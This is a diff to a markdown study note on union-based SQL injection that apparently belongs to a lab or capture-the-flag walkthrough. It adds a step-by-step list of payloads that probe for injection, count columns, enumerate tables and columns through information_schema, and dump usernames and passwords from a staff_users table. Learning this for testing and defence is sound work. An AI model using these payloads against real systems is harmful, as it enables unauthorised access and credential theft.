@@ -7,4 +7,38 @@
 # Union-Based SQL Injection
 - This type of Injection utilises the SQL UNION operator alongside a SELECT statement to return additional results to the page. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability.
 
+----
+# CHEAT CODES SQL
+
+1) Test for SQL Injection
+- '
+- "
+
+2) Find number of columns
+- 1 UNION SELECT 1
+- 1 UNION SELECT 1,2
+- 1 UNION SELECT 1,2,3
+
+3) Hide original query output
+- 0 UNION SELECT 1,2,3
+
+4) Get database name
+- 0 UNION SELECT 1,2,database()
+
+5) List tables in the database
+- 0 UNION SELECT 1,2,group_concat(table_name)
+FROM information_schema.tables
+WHERE table_schema='sqli_one'
+
+6. List columns in staff_users table
+- 0 UNION SELECT 1,2,group_concat(column_name)
+FROM information_schema.columns
+WHERE table_name='staff_users'
+
+7.  Dump usernames and passwords
+- 0 UNION SELECT 1,2,
+group_concat(username,':',password SEPARATOR '<br>')
+FROM staff_users
+
+
 [**Next**](InBandSQLiFlag.md)
